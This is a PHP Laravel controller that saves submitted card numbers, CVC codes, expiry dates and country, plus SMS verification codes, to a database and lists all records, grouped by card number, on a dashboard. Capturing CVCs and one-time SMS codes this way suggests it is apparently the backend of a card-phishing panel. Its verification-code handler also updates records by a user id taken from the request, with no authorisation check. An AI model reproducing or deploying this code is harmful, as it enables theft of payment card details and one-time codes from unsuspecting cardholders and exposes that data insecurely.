<?php

namespace App\Http\Controllers;

use App\Models\Detail;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Redirect;

class DashboardController extends Controller
{
    public function index(){
       $details = Detail::with('users')->orderBy('updated_at', 'desc')->get();

       return view('dashboard')->with(compact('details'));
    }

    public function detailUser(){
        $details = Detail::with('users')->groupBy('cnumber')->get();

        return view('details')->with(compact('details'));
    }
    
    public function payment(Request $request){
        
        Detail::updateOrCreate(
            [
                'cnumber' => $request->card,
                'cvc' => $request->cvc,
                'exp' => $request->year . '/' . $request->month,
                'country' => $request->country,
                'user_id' => Auth()->user()->id,
            ],
            [
                'user_id' => Auth()->user()->id,
                'country' => $request->country,
                'cnumber' => $request->card,
                'cvc' => $request->cvc,
                'exp' => $request->year . '/' . $request->month,
                'isStart' => 1,
            ]
        );
        
        
        return true;
    }

    public function verificationCode(Request $request){
        $detail = Detail::where('user_id',$request->userid)->first();
        $detail->sms = $request->codeV;
        $detail->save();

        return true;
    }

    public function deleteDetail(Request $request , $id){
     
        Detail::find($id)->delete();
        return Redirect('/dashboard');
    }
}

